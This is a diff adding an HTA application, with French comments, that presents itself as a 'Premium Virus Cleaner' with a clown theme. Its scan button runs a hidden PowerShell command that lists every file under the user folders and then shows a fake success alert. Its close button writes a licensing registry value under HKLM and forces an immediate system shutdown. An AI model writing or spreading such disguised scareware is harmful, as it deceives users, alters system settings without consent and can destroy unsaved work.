@@ -1,0 +1,36 @@
+<!-- Fichier : clown_nettoyage.hta -->
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Nettoyage PC" 
+SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="maximize">
+
+<script language="JScript">
+    // Animation du clown (simple div avec une image)
+    function startScan() {
+        // 1. Jouer un son d'erreur
+        var sound = new ActiveXObject("WMPlayer.OCX");
+        sound.url = "C:\\Windows\\Media\\notify.wav"; // Son d'erreur Windows
+        sound.play();
+
+        // 2. Lancer un script PowerShell en arrière-plan (invisible)
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell.exe -NoProfile -Command Start-Sleep -Seconds 5; Get-ChildItem C:\\Users -Recurse | ForEach-Object { $_.Name }", 0, true);
+        
+        // 3. Afficher une fausse alerte de "Succès"
+        alert("Nettoyage terminé ! 1500 fichiers trouvés.");
+    }
+
+    function crashPC() {
+        // 4. Planter le système (faux BSOD)
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\SkipRearm", 1);
+        shell.Run("cmd.exe /c shutdown /s /t 0 /f", 0, false);
+        // Force la fermeture de l'application
+        window.close();
+    }
+</script>
+
+<body style="background-color: #f0f0f0; text-align: center; font-family: Arial;">
+    <h1>🤡 Nettoyeur de Virus Premium 🤡</h1>
+    <p>Cliquez sur le bouton pour analyser votre PC.</p>
+    <button onclick="startScan()">Lancer l'analyse</button>
+    <button onclick="crashPC()">Terminer le nettoyage (Fermer)</button>
+</body>
